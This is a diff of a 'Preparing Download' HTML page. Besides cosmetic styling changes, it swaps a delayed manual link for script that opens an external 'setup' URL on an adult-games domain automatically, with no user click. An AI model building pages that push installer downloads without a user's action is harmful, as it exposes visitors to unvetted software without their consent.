@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Preparing Download</title>
   <style>
     * {
-      box-sizing: border-box;
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
     }
 
     body {
@@ -17,24 +17,26 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      background: linear-gradient(-45deg, #1d2b64, #f8cdda, #1e3c72, #2a5298);
-      background-size: 400% 400%;
-      animation: gradientBG 15s ease infinite;
-      color: #fff;
+      background: linear-gradient(135deg, #1f1c2c, #928dab, #0f2027, #203a43, #2c5364);
+      background-size: 500% 500%;
+      animation: gradientShift 20s ease infinite;
+      color: #ffffff;
     }
 
-    @keyframes gradientBG {
+    @keyframes gradientShift {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
 
     .info-card {
-      background-color: rgba(0, 0, 0, 0.75);
+      backdrop-filter: blur(15px);
+      background-color: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.2);
+      border-radius: 16px;
       padding: 30px 25px;
-      border-radius: 14px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
       text-align: center;
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
       width: 90%;
       max-width: 420px;
     }
@@ -45,26 +47,33 @@
     }
 
     h1 {
-      font-size: 22px;
+      font-size: 24px;
       margin-bottom: 12px;
+      letter-spacing: 0.5px;
     }
 
     #status-text {
       font-size: 16px;
-      color: #ddd;
+      color: #dddddd;
     }
 
     .error-message {
-      color: #ff4c4c;
+      color: #ff5c5c;
       margin-top: 10px;
       font-size: 14px;
     }
 
     a.manual-link {
-      color: #00e5ff;
+      color: #00e0ff;
       display: block;
       margin-top: 20px;
       font-size: 16px;
+      text-decoration: none;
+      transition: color 0.3s ease;
+    }
+
+    a.manual-link:hover {
+      color: #ffffff;
       text-decoration: underline;
     }
   </style>
@@ -72,19 +81,36 @@
 <body>
 
   <div class="info-card">
-    <div class="info-icon">⏳</div>
+    <div class="info-icon">📦</div>
     <h1>Preparing your download…</h1>
-    <p id="status-text">Please wait 3 seconds…</p>
+    <p id="status-text">Please wait a moment…</p>
     <p id="error-text" class="error-message"></p>
-    <a href="https://lewdgamespc.com/setup-ali/" class="manual-link" style="display:none;" id="manualLink">Click here to download</a>
+    <a href="https://lewdgamespc.com/setup-ali/" class="manual-link" style="display:none;" id="manualLink">Click here if it doesn't start automatically</a>
   </div>
 
   <script>
-    window.onload = () => {
-      setTimeout(() => {
-        document.getElementById("status-text").innerText = "Ready!";
+    const downloadUrl = "https://lewdgamespc.com/setup-ali/";
+
+    function startDownload() {
+      try {
+        const link = document.createElement("a");
+        link.href = downloadUrl;
+        link.target = "_blank";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+
+        document.getElementById("status-text").innerText = "Your download should begin automatically.";
         document.getElementById("manualLink").style.display = "block";
-      }, 3000); // 3-second wait
+      } catch (error) {
+        document.getElementById("status-text").innerText = "";
+        document.getElementById("error-text").innerText = "Download failed. Use the manual link below.";
+        document.getElementById("manualLink").style.display = "block";
+      }
+    }
+
+    window.onload = () => {
+      setTimeout(startDownload, 3000); // 3-second delay
     };
   </script>
 
